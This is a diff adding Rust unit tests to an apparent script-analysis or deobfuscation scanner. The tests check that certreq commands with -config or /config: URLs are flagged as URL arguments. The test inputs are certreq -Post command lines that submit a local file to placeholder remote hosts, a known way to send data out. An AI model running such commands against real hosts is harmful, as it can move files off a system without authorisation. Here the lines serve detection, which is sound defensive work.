@@ -7185,6 +7185,51 @@ mod msiexec_tests {
 }
 
 #[cfg(test)]
+mod certreq_tests {
+    use crate::env::{Config, Environment};
+    use crate::interp::interpret_line;
+    use crate::traits::Trait;
+
+    #[test]
+    fn certreq_config_url_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"certreq -Post -config "https://certreq-direct.example/submit" request.req response.txt"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://certreq-direct.example/submit"
+            )
+        });
+        assert!(has, "certreq config URL not typed: {:?}", env.traits);
+    }
+
+    #[test]
+    fn certreq_attached_config_url_emits_typed_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"certreq -Post /config:https://certreq-attached.example/submit request.req response.txt"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://certreq-attached.example/submit"
+            )
+        });
+        assert!(
+            has,
+            "certreq attached config URL not typed: {:?}",
+            env.traits
+        );
+    }
+}
+
+#[cfg(test)]
 mod regsvr32_tests {
     use crate::env::{Config, Environment};
     use crate::interp::interpret_line;
@@ -12678,6 +12723,60 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                 .iter()
                 .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
             "msiexec attached schemeless package URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certreq_config_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://certreq-deob.example/submit";
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"certreq -Post -config "{url}" request.req response.txt"#),
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { url: got, .. } if got == url
+                )
+            }),
+            "certreq config URL not typed in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "certreq config URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certreq_attached_config_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://certreq-attached-deob.example/submit";
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"certreq.exe /f /config:{url} request.req response.txt"#),
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { url: got, .. } if got == url
+                )
+            }),
+            "certreq attached config URL not typed in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "certreq attached config URL double-emitted as generic: {:?}",
             env.traits
         );
     }
